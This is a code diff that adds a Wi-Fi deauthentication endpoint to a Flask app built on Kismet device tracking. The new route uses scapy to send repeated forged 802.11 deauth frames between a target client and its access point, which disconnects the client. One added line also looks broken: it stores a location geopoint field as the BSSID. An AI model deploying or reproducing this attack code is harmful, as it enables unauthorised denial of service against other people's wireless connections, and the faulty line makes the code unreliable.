@@ -3,6 +3,9 @@ from flask import Flask, render_template, Response, redirect, url_for, request
 from flask_bootstrap import Bootstrap
 import json
 import time
+import scapy.layers.dot11
+from scapy.all import sendp
+
 from mac import Mac
 from random import randint
 
@@ -34,6 +37,7 @@ def df():
             results = mac.retrieve_mac()
             rssi = results[0]['kismet.common.signal.last_signal']
             mac.current_channel = results[0]['kismet.device.base.channel']
+            mac.bssid = results[0]['kismet.device.base.location/kismet.common.location.last/kismet.common.location.geopoint']
             response[0] = 120 - (int(rssi) * -1)
             response[1] = rssi
             response[2] = mac.current_channel
@@ -74,6 +78,38 @@ def survey_channels(uuid, option):
         case _:
             pass
     return f"New channels set for {uuid}"
+
+@app.route("/deauth/<string:interface>/<string:reason>/<string:count>/<string:behavior>")
+def deauth(interface, reason, count, behavior):
+    interface = json.loads(interface)['interface']
+    reason = int(json.loads(reason)['reason'])
+    count = int(json.loads(count)['count'])
+    behavior = json.loads(behavior)['behavior']
+    print(interface, reason, count, behavior)
+
+    def shoot():
+        dot11_bssid = scapy.layers.dot11.Dot11(
+            type=0,
+            subtype=12,
+            addr1=mac.mac,
+            addr2=mac.bssid,
+            addr3=mac.bssid,
+        )
+        dot11_client = scapy.layers.dot11.Dot11(
+            type=0,
+            subtype=12,
+            addr1=mac.bssid,
+            addr2=mac.mac,
+            addr3=mac.bssid
+        )
+        deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
+        frame_bssid = scapy.layers.dot11.RadioTap() / dot11_bssid / deauth_frame
+        frame_client = scapy.layers.dot11.RadioTap() / dot11_client / deauth_frame
+        sendp(frame_bssid, iface=interface, count=count, inter=0.100)
+        sendp(frame_client, iface=interface, count=count, inter=0.100)
+
+    shoot()
+    return f"{count} deauths sent to {mac.mac} from {mac.bssid}"
 
 @app.route('/test', methods=['POST', 'GET'])
 def test():
